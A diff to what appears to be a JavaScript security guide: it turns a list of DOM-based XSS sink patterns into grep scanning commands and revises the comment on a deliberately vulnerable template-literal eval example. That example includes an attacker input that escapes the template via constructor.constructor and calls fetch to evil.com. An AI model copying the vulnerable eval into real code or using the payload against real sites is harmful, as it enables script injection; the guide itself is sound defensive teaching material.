@@ -146,19 +146,19 @@ document.getElementById('output').innerHTML = clean;
 
 ### Detection Patterns
 
-```
-# Grep patterns for DOM-based XSS sinks
-\.innerHTML\s*=
-\.outerHTML\s*=
-document\.write\s*\(
-document\.writeln\s*\(
-eval\s*\(
-setTimeout\s*\(\s*['"`]
-setInterval\s*\(\s*['"`]
-new\s+Function\s*\(
-\.insertAdjacentHTML\s*\(
-\$\(.*\)\.html\s*\(
-\$\(.*\)\.append\s*\(
+Run as `grep -rnP` (PCRE) so the `\s` and character-class escapes behave as expected; for POSIX-ERE grep use `[[:space:]]` in place of `\s`.
+
+```bash
+# DOM-based XSS sinks (PCRE)
+grep -rnP '\.innerHTML\s*=' --include='*.js' --include='*.ts' --include='*.jsx' --include='*.tsx' .
+grep -rnP '\.outerHTML\s*=' --include='*.js' --include='*.ts' --include='*.jsx' --include='*.tsx' .
+grep -rnP 'document\.write(ln)?\s*\(' --include='*.js' --include='*.ts' --include='*.jsx' --include='*.tsx' .
+grep -rnP '\beval\s*\(' --include='*.js' --include='*.ts' --include='*.jsx' --include='*.tsx' .
+grep -rnP 'setTimeout\s*\(\s*['\''"`]' --include='*.js' --include='*.ts' --include='*.jsx' --include='*.tsx' .
+grep -rnP 'setInterval\s*\(\s*['\''"`]' --include='*.js' --include='*.ts' --include='*.jsx' --include='*.tsx' .
+grep -rnP 'new\s+Function\s*\(' --include='*.js' --include='*.ts' --include='*.jsx' --include='*.tsx' .
+grep -rnP '\.insertAdjacentHTML\s*\(' --include='*.js' --include='*.ts' --include='*.jsx' --include='*.tsx' .
+grep -rnP '\$\(.*\)\.(html|append)\s*\(' --include='*.js' --include='*.ts' .
 ```
 
 ---
@@ -734,8 +734,9 @@ console.log(fn(2, 3));
 ### Vulnerability: Template Literal Injection
 
 ```javascript
-// VULNERABLE: Server-side template literals with user data
-// If the server renders this template with user-controlled `name`:
+// VULNERABLE: Client-side template literal injection via dynamic evaluation.
+// If `name` is attacker-controlled, the backtick template is parsed fresh
+// in page context, and expression substitution runs arbitrary JavaScript.
 const greeting = eval('`Hello, ${name}!`');
 // Attacker name: ${constructor.constructor('return this')().fetch('https://evil.com')}
 ```
